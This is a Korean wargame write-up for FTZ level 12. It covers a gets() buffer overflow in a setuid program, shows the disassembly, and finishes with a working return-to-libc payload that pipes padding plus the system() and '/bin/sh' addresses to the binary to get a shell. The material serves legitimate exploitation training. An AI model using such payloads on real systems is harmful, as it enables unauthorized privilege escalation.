---
sort: 12
---

# Level 12

```note
id : level12

password : it is like this
```

hint를 보면 attackme의 소스코드가 나온다.<br>
attackme에 setuid가 걸려있으니 얘를 공격해보자.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
int main( void )
{
	char str[256];

 	setreuid( 3093, 3093 );
	printf( "문장을 입력하세요.\n" );
	gets( str );
	printf( "%s\n", str );
}
```

gets는 input의 길이에 상관없이 개행문자를 만날때까지 복사를 한다. 따라서 buffer overflow 취약점이 존재한다.<br>
이번에는 argv가 아니라 stdin을 통해서 입력받기 때문에 pipe를 이용하여 입력해야하는 점을 제외하면 level11과 똑같다<br><br>
GDB를 이용하여 attackme의 main함수를 disassemble했다.

<pre>
(gdb) disas main
Dump of assembler code for function main:
0x08048470 (main+0):	push   %ebp
0x08048471 (main+1):	mov    %esp,%ebp
0x08048473 (main+3):	sub    $0x108,%esp
0x08048479 (main+9):	sub    $0x8,%esp
0x0804847c (main+12):	push   $0xc15
0x08048481 (main+17):	push   $0xc15
0x08048486 (main+22):	call   0x804835c (setreuid)
0x0804848b (main+27):	add    $0x10,%esp
0x0804848e (main+30):	sub    $0xc,%esp
0x08048491 (main+33):	push   $0x8048538
0x08048496 (main+38):	call   0x804834c (printf)
0x0804849b (main+43):	add    $0x10,%esp
0x0804849e (main+46):	sub    $0xc,%esp

<b>0x080484a1 (main+49):	lea    0xfffffef8(%ebp),%eax
0x080484a7 (main+55):	push   %eax
0x080484a8 (main+56):	call   0x804831c (gets) </b>

0x080484ad (main+61):	add    $0x10,%esp
0x080484b0 (main+64):	sub    $0x8,%esp
0x080484b3 (main+67):	lea    0xfffffef8(%ebp),%eax
0x080484b9 (main+73):	push   %eax
0x080484ba (main+74):	push   $0x804854c
0x080484bf (main+79):	call   0x804834c (printf)
0x080484c4 (main+84):	add    $0x10,%esp
0x080484c7 (main+87):	leave  
0x080484c8 (main+88):	ret    
0x080484c9 (main+89):	lea    0x0(%esi),%esi
</pre>

```bash
[level12@ftz level12]$ ldd ./attackme 
	libc.so.6 => /lib/tls/libc.so.6 (0x42000000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
```

stdin으로 입력받는 것을 제외하면 level11과 환경이 완벽하게 같은 것을 확인할 수 있다. 따라서 아래와 같이 shell을 딸 수 있었다. pipe를 이용하여 stdin으로 redirect했다. `;cat`을 붙이는 이유는 쉘을 딴 후에도 stdin은 pipe에 의해 redirect되어있는 상태기 때문에 cat을 통해서 shell로 input을 전달하도록 해야한다.

```bash
# padding 0x10c byte + system함수 주소 + 4byte padding + "/bin/sh" 주소
[level12@ftz level12]$ (python -c "print('A'*0x10c + '\xc0\xf2\x03\x42\x41\x41\x41\x41\xa4\x7e\x12\x42\n')";cat) | ./attackme
문장을 입력하세요.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA쟌BAAAA?B
my-pass
```

```tip
## 알게 된 점

buffer overflow, RTL

pipe
```